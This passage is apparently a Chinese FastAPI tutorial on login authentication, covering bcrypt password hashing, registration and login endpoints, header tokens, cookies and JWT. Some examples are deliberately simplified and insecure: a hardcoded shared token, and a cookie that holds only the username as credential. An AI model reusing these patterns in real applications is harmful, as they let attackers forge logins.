所谓的md5加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br>m = hashlib.md5(<span class="hljs-string">&quot;盐&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<span class="hljs-comment"># 支持加盐</span><br>m.update(<span class="hljs-string">&quot;hello&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><br><span class="hljs-built_in">print</span>(m.digest())       <span class="hljs-comment"># 加密后的二进制文本</span><br><span class="hljs-built_in">print</span>(m.hexdigest())    <span class="hljs-comment"># 以16进制形式返回加密内容</span><br></code></pre></td></tr></table></figure><p>示例2：使用第三方库 passlib</p><blockquote><p>pip install “passlib[bcrypt]”</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> passlib.context <span class="hljs-keyword">import</span> CryptContext<br><br>crypt = CryptContext(schemes=[<span class="hljs-string">&quot;bcrypt&quot;</span>], deprecated=<span class="hljs-string">&quot;auto&quot;</span>)<br><br>crypt.<span class="hljs-built_in">hash</span>(<span class="hljs-string">&quot;hello&quot;</span>)<span class="hljs-comment"># 加密</span><br></code></pre></td></tr></table></figure><h1 id="9-3-集成MySQL的注册"><a href="#9-3-集成MySQL的注册" class="headerlink" title="9-3 集成MySQL的注册"></a>9-3 集成MySQL的注册</h1><p>第一步：数据持久化</p><ul><li>新建用户表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE `users` ( <br>    `id` int(11) NOT NULL AUTO_INCREMENT,<br>    `username` varchar(255) NOT NULL,<br>    `password` varchar(255) NOT NULL,<br>    `email` varchar(255) NOT NULL,<br>    PRIMARY KEY (`id`) # id 主键<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin AUTO_INCREMENT=1 ;<br></code></pre></td></tr></table></figure><ul><li>使用SQLAlchemy的ORM操作数据库（基于之前的代码结构，其他模块代码见源文件）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Form, Depends, HTTPException<br><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> Session<br><span class="hljs-keyword">from</span> passlib.context <span class="hljs-keyword">import</span> CryptContext<br><br><span class="hljs-keyword">from</span> database <span class="hljs-keyword">import</span> get_db<br><span class="hljs-keyword">from</span> models <span class="hljs-keyword">import</span> User<br><span class="hljs-keyword">from</span> schemas <span class="hljs-keyword">import</span> UserOut<br><br>app = FastAPI(title=<span class="hljs-string">&quot;登录认证相关&quot;</span>)<br><br><br>crypt = CryptContext(schemes=[<span class="hljs-string">&quot;bcrypt&quot;</span>], deprecated=<span class="hljs-string">&quot;auto&quot;</span>) <span class="hljs-comment"># 实例化对象，用这个对象的hash方法去加密密码</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserForm</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>), password: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>), re_password: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>), email: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>)</span>):<br>        self.username = username<br>        self.password = password<br>        self.re_password = re_password<br>        self.email = email<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/register&quot;</span>, response_model=UserOut</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">user: UserForm = Depends(<span class="hljs-params"></span>), db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    <span class="hljs-comment"># 注册接口核心部分，此部分没有放在crud.py文件中, 可以自行处理下</span><br>    <span class="hljs-comment"># 判断用户名是否存在</span><br>    <span class="hljs-keyword">if</span> db.query(User).<span class="hljs-built_in">filter</span>(User.username == user.username).first():<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">&quot;用户名已存在&quot;</span>, status_code=<span class="hljs-number">400</span>)<br>    <span class="hljs-keyword">if</span> user.password != user.re_password:<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">&quot;两次密码输入不一致&quot;</span>, status_code=<span class="hljs-number">400</span>)<br><br>    <span class="hljs-comment"># 新增用户</span><br>    new_user = User(<br>        username=user.username,<br>        password=crypt.<span class="hljs-built_in">hash</span>(user.password),<span class="hljs-comment"># 密文存储</span><br>        email=user.email<br>    )<br>    db.add(new_user) <span class="hljs-comment"># 这里保存的应该就是加密后的密码了。所以前面校验是否存在的代码应该要加密一下？</span><br>    db.commit()<br>    db.refresh(new_user)<br>    <span class="hljs-keyword">return</span> new_user<br></code></pre></td></tr></table></figure><h1 id="9-4-用户登录"><a href="#9-4-用户登录" class="headerlink" title="9-4 用户登录"></a>9-4 用户登录</h1><p>登录接口的作用：通过用户输入用户名和密码，找到该用户在本网站上的基本信息。</p><p>登录接口的核心逻辑：校验用户名和密码是否和数据库中保存的像匹配，匹配则登录成功，否则失败</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, response_model=UserOut</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">username: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>), password: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>), db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    <span class="hljs-comment"># 根据用户名找该用户是否存在</span><br>    db_user: User = db.query(User).filter_by(username=username).first()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> db_user:<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">&quot;用户名不存在&quot;</span>, status_code=<span class="hljs-number">400</span>)<br>    <span class="hljs-comment"># 使用crypt.verify校验密码是否正确</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> crypt.verify(password, db_user.password): <span class="hljs-comment"># 这里用到的验证就是加解密的验证</span><br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">&quot;用户名或密码错误&quot;</span>, status_code=<span class="hljs-number">400</span>)<br>    <span class="hljs-keyword">return</span> db_user<br></code></pre></td></tr></table></figure><p><strong>补充</strong>：校验明文密码和数据库中密文密码匹配的原理</p><ul><li><p>hash的原理：使用相同的加密算法，相同的明文加密后得到相同的密文。</p></li><li><p>把用户的明文密码通过相同的加密算法得到的密文，和数据库中的密文相比较，相同则说明密码正确。</p></li></ul><h1 id="9-5-记录用户登录状态的方式"><a href="#9-5-记录用户登录状态的方式" class="headerlink" title="9-5 记录用户登录状态的方式"></a>9-5 记录用户登录状态的方式</h1><p><strong>需求场景</strong></p><p>对于电商购物网站，网站知道当前浏览网站的用户是谁，该用户购物车有哪些商品，该用户买了哪些商品等等。</p><p>这些需求的一个核心点就是，网站的服务端需要知道当前用户是谁。</p><p>遗憾的是，HTTP协议是无状态的，即服务端不会记录客户端的每一次请求，即每一个请求对服务端来说都是 “陌生人”。</p><p><strong>解决方式</strong></p><p>计算机本身无法判断坐在显示器前的使用者的身份。进一步说，也无法确认网络的那头究竟有谁。可见，为了弄清究竟是谁在访问服务 器，就得让对方的客户端自报家门。</p><p>解决方式：用户登录认证。</p><p>核心原理：用户登录之后就给用户一个身份标识，客户端再次访问服务端时带上这个身份标识，那服务端就知道该用户的身份。——<code>打标签</code></p><p>常用的具体实现方式：</p><ul><li><strong>让用户在请求头中携带唯一标识</strong> token就来了，所谓的令牌</li><li>使用cookie</li><li>使用<strong>jwt</strong></li></ul><h1 id="9-6-使用请求头实现登录认证"><a href="#9-6-使用请求头实现登录认证" class="headerlink" title="9-6 使用请求头实现登录认证"></a>9-6 使用请求头实现登录认证</h1><p>在请求头中实现登录认证的方式，其实很简单，具体实现逻辑如下：</p><ul><li>当用户访问后端服务时，后端判断请求头中是否有指定的请求头键值对，有且正确则该用户是登录过的。</li><li>如果请求头中没有指定的键值对，则是无效的请求。</li></ul><p>示例：请求头中有合法的键值对才可以获取访问的图书信息。</p><ul><li>当请求中没有 x-token时，或者它的值不是指定的合法token时，都校验会校验失败，得不到数据。</li><li>用户在登录之后才能获得一个x-token，然后请求其他接口时在请求头中携带者x-token才能获取数据。</li><li>即只有携带这个正确的x-token才是经过登录认证的用户，才允许获取数据。有令牌，畅通无阻</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">X_TOKEN = <span class="hljs-string">&quot;SDNQOEFJQIEVNFWESCVMWE&quot;</span><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, response_model=UserOut</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">response: Response,  username: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>), password: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>), db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    db_user: User = db.query(User).filter_by(username=username).first()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> db_user:<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">&quot;用户名不存在&quot;</span>, status_code=<span class="hljs-number">400</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> crypt.verify(password, db_user.password):<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">&quot;用户名或密码错误&quot;</span>, status_code=<span class="hljs-number">400</span>)<br>       <br>    <span class="hljs-comment"># 之前有介绍的如何设置响应头，其实就是调response的headres </span><br>    response.headers[<span class="hljs-string">&quot;x-token&quot;</span>] = X_TOKEN<br>    <span class="hljs-keyword">return</span> db_user<br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/books&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">books</span>(<span class="hljs-params">x_token: typing.<span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>] = Header(<span class="hljs-params"></span>)</span>):<br>    <span class="hljs-keyword">if</span> x_token <span class="hljs-keyword">and</span> x_token == X_TOKEN: <span class="hljs-comment"># 在判断x_token是否存在，且判断x_token是否等于我们设定的X_TOKEN </span><br>        <span class="hljs-keyword">return</span> [&#123;<span class="hljs-string">&quot;id&quot;</span>: i, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">f&quot;book<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>&#125; <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>)] <span class="hljs-comment"># 是就返回数据，</span><br>    <br>    <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">&quot;Invalid x_token&quot;</span>, status_code=<span class="hljs-number">404</span>) <span class="hljs-comment"># 不是就报错</span><br></code></pre></td></tr></table></figure><h1 id="9-7-使用Cookie实现登录认证【浏览器】"><a href="#9-7-使用Cookie实现登录认证【浏览器】" class="headerlink" title="9-7 使用Cookie实现登录认证【浏览器】"></a>9-7 使用Cookie实现登录认证【浏览器】</h1><p><strong>Cookie</strong></p><ul><li>储存在用户<strong>本地终端上</strong>的数据 （<code>在用户设备上生成的一个文件</code>）</li><li>Cookie是一段不超过<strong>4KB的小型文本数据</strong>，由一个名称（Name）、一个值（Value）和其它几个用于控制Cookie有效期、安全性、使用范围的可选属性组成</li><li>只要是有效的Cookie，浏览器下次访问服务器时，就会在请求中携带cookie文本中的数据。</li></ul><p>示例1：获取和设置cookie</p><ul><li>在谷歌浏览器中打开F12查看NetWork和Applications中的Cookies</li><li>set_cookie时可以value可以是一个单纯的字符串，也可以是一个被json序列化的的Python数据结构，比如字典。</li></ul><p><img src="/img/fastapi/cookie.png" alt="cookie"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Response, Cookie<br><br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/set&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_cookie</span>(<span class="hljs-params">response: Response</span>):<br>    <span class="hljs-comment"># 设置cookie, 需要 key和value，还可以设置过期时间（单位:秒）</span><br>    response.set_cookie(<span class="hljs-string">&quot;x_token&quot;</span>, <span class="hljs-string">&quot;you_auth_token&quot;</span>, <span class="hljs-number">60</span> * <span class="hljs-number">60</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span><br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/get&quot;</span></span>)</span><br><span class="hljs-comment"># 获取cookie, Cookie()的用法和Path()\Header()等类似</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_cookie</span>(<span class="hljs-params">x_token: <span class="hljs-built_in">str</span> = Cookie(<span class="hljs-params"></span>)</span>):    <br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&quot;x-token&quot;</span>: x_token<br>    &#125;<br></code></pre></td></tr></table></figure><p>示例2：使用cookie做登录认证</p><ul><li>登录时设置cookie，使用用户名当cookie的值</li><li>访问图书资源时，携带cookie, 通过cookie中的用户名，可以知道当前用户的身份信息</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span>  Cookie, Response<br><br>...<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, response_model=UserOut</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">response: Response,  username: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>), password: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>), db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    db_user: User = db.query(User).filter_by(username=username).first()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> db_user:<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">&quot;用户名不存在&quot;</span>, status_code=<span class="hljs-number">400</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> crypt.verify(password, db_user.password):<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">&quot;用户名或密码错误&quot;</span>, status_code=<span class="hljs-number">400</span>)<br><br>    <span class="hljs-comment"># 在响应中设置cookie,</span><br>    response.set_cookie(<span class="hljs-string">&quot;x_token&quot;</span>, db_user.username, <span class="hljs-number">60</span> * <span class="hljs-number">60</span>)<br>    <span class="hljs-keyword">return</span> db_user<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/books&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">books</span>(<span class="hljs-params">x_token: typing.<span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>] = Cookie(<span class="hljs-params"></span>),  db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> x_token:<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">&quot;Invalid x_token&quot;</span>, status_code=<span class="hljs-number">404</span>)<br>     <br>    db_user: User = db.query(User).filter_by(username=x_token).first()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> db_user:<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">&quot;Invalid x_token&quot;</span>, status_code=<span class="hljs-number">404</span>)<br>    <br>    <span class="hljs-keyword">return</span> [&#123;<span class="hljs-string">&quot;id&quot;</span>: i, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">f&quot;book<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>&#125; <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>)]<br></code></pre></td></tr></table></figure><p>Cookie的优点和缺点： 是一个文件</p><ul><li>优点：简单方便</li><li>缺点：不安全，cookie信息可能被篡改。</li></ul><h1 id="9-8-使用jwt登录认证-理论篇【主流使用】"><a href="#9-8-使用jwt登录认证-理论篇【主流使用】" class="headerlink" title="9-8 使用jwt登录认证-理论篇【主流使用】"></a>9-8 使用jwt登录认证-理论篇【主流使用】</h1><p>使用Cookie的方式做登录认证，简单方便，但是存在安全隐患，一般还不推荐使用。</p><p>Cookie之所以不安全的根本原因是：用户信息直接存放在<strong>浏览器</strong>，在网络传输中既有可能被<strong>非法篡改</strong>。</p><p><strong>所以，后来出现了把用户信息存放在服务器端的技术Session</strong>，不过session也就基于cookie实现的。</p><ul><li>Session的处理逻辑如下：</li><li>用户登录成功后，服务端会将用户的身份信息（用户ID, 邮箱等唯一信息）加密成一个随机字符串sessionid，将sessionid和用户信息做一个映射关系，存在服务器的数据库中。</li><li>然后，把sessionid返回给浏览器，保存在cookie中，所以session技术是基于cookie的。</li><li>最后，当浏览再次请求服务器时，携带这个sessionid。服务端会校验这个session是否在数据库中有关联用户，以及是否过期等校验，校验通过后才是合法用户，才可以获取请求数据。</li></ul><p>但是，session技术因为需要把信息存放在服务器，这样会造成维护成本高，且不容易做分布式服务。并且，一旦sessionid泄露，也是不安全的。</p><p><img src="/img/fastapi/image-20220728212753754.png" alt="image-20220728212753754"></p><p>因为sessionid的限制，后来又出现了目前比较流行的解决方案，那就是 <strong>JWT（json web token）</strong></p><blockquote><p> Token: 是一个广义的词，是令牌的意思</p><p> 第一种： 在请求头包含token，这样的做法就是暴露了</p><p> 第二种：在cookie上保留token</p><p> 第三种：在cookie上保留JWT ，JWT特殊加密，包含三部分，头部、负载、签名 负载就是用户的信息，只不过是加密过后的用户信息，</p><p> 将用户的信息加密后保存在cookie上成一串JWT键值对，cookie是一个小文件保存在浏览器上，下次请求的时候，就会带上这个JWT去请求后段，就会通过验证，当然也可以将这个JWT token放在请求头上，都可以</p></blockquote><p>JWT的生成token格式如下，由 <code>.</code> 连接的三段字符串组成。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># eyjJhbGciOiJqUadI1ASiIsInR5cCI6IkpXC8.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span><br></code></pre></td></tr></table></figure><p>JWT token是如何签发流程：</p><ul><li>第一段HEADER部分，固定包含算法和token类型，对此做JSON序列化并进行base64url加密。</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;<span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;HS256&quot;</span>,  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span>&#125;<br></code></pre></td></tr></table></figure><ul><li>第二段PAYLOAD部分，包含一些数据，对此做JSON序列化并进行base64url加密。（payloads：有效载荷 拍喽得）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;1234567890&quot;</span>, <span class="hljs-string">&quot;user_id&quot;</span>: <span class="hljs-number">20202</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;liuxu&quot;</span>,  <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;liuxu@as.com&quot;</span>  ...&#125;<br></code></pre></td></tr></table></figure><p>第三段SIGNATURE部分，把前两段通过<code>.</code>拼接起来，然后对其进行<code>HS256</code>加密，再然后对<code>hs256</code>密文进行base64url加密，最终得到token的第三段。对<code>hs256</code>加密时一般会做加盐处理。（signatures：签名 sin呢缺）</p><p>最后将三段字符串通过 <code>.</code>拼接起来就生成了jwt的token。</p><p>JWT token的校验和提取用户信息流程：</p><ul><li>与签发流程相反</li></ul><h1 id="9-9-使用jwt登录认证-实现"><a href="#9-9-使用jwt登录认证-实现" class="headerlink" title="9-9 使用jwt登录认证-实现"></a>9-9 使用jwt登录认证-实现</h1><ul><li>使用第三方模块实现 jwttoken的生成和校验，使用前先下载安装：<code>pip3 install pyjwt</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><br><br>secret_key = <span class="hljs-string">&quot;加盐的秘钥&quot;</span><br>data = &#123;<span class="hljs-string">&quot;user_id&quot;</span>: <span class="hljs-number">20202</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;liuxu&quot;</span>,  <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;liuxu@as.com&quot;</span>&#125;<br><br><br><span class="hljs-comment"># 生成jwttoken</span><br>jwt_token = jwt.encode(payload=data, key=secret_key)<br><span class="hljs-built_in">print</span>(jwt_token)<br><br><span class="hljs-comment"># 解析jwttoken得到用户信息</span><br>raw_data = jwt.decode(jwt_token, key=secret_key, algorithms=<span class="hljs-string">&quot;HS256&quot;</span>)<br><span class="hljs-built_in">print</span>(raw_data)<br></code></pre></td></tr></table></figure><p>代码解析：</p><ul><li>使用 <code>jwt.encode()</code>签发token</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params"></span><br><span class="hljs-params">    self,</span><br><span class="hljs-params">    payload: <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>],<span class="hljs-comment"># 是需要加密的用户基本信息，比如id等，不要把用户密码放在里面</span></span><br><span class="hljs-params">    key: <span class="hljs-built_in">str</span>,   <span class="hljs-comment"># 加密时使用的秘钥，解密时也需要它</span></span><br><span class="hljs-params">    algorithm: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>] = <span class="hljs-string">&quot;HS256&quot;</span>,<span class="hljs-comment"># 加密的算法，默认是HS256，解密时需要使用相同的算法</span></span><br><span class="hljs-params">    headers: <span class="hljs-type">Optional</span>[<span class="hljs-type">Dict</span>] = <span class="hljs-literal">None</span>,<span class="hljs-comment"># jwttoken中的第一部分，不指定时默认是&#123;&quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: algorithm&#125;</span></span><br><span class="hljs-params">    json_encoder: <span class="hljs-type">Optional</span>[<span class="hljs-type">Type</span>[json.JSONEncoder]] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params"></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><ul><li>使用 <code>jwt.decode</code>解析token</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params"></span><br><span class="hljs-params">    self,</span><br><span class="hljs-params">    jwt: <span class="hljs-built_in">str</span>,<span class="hljs-comment"># jwt token</span></span><br><span class="hljs-params">    key: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;&quot;</span>,      <span class="hljs-comment"># 加密时使用的秘钥</span></span><br><span class="hljs-params">    algorithms: <span class="hljs-type">Optional</span>[<span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>]] = <span class="hljs-literal">None</span>,   <span class="hljs-comment"># 加密时使用的算法，必须设置</span></span><br><span class="hljs-params">    options: <span class="hljs-type">Optional</span>[<span class="hljs-type">Dict</span>] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">    **kwargs,</span><br><span class="hljs-params"></span>) -&gt; <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]:<br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><ul><li>给token设置过期时间，在payload中增加<code>exp</code>字段，它的值是一个datetime对象或者时间戳 exp:expired</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">import</span> datetime<br><br>secret_key = <span class="hljs-string">&quot;加盐的秘钥&quot;</span><br>data = &#123;<span class="hljs-string">&quot;user_id&quot;</span>: <span class="hljs-number">20202</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;liuxu&quot;</span>, <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;liuxu@as.com&quot;</span>,<br>        <span class="hljs-string">&quot;exp&quot;</span>: datetime.datetime.now() + datetime.timedelta(days=<span class="hljs-number">1</span>)&#125;<br><br><br>jwt_token = jwt.encode(payload=data, key=secret_key)<br>raw_data = jwt.decode(jwt_token, key=secret_key, algorithms=<span class="hljs-string">&quot;HS256&quot;</span>)<br><span 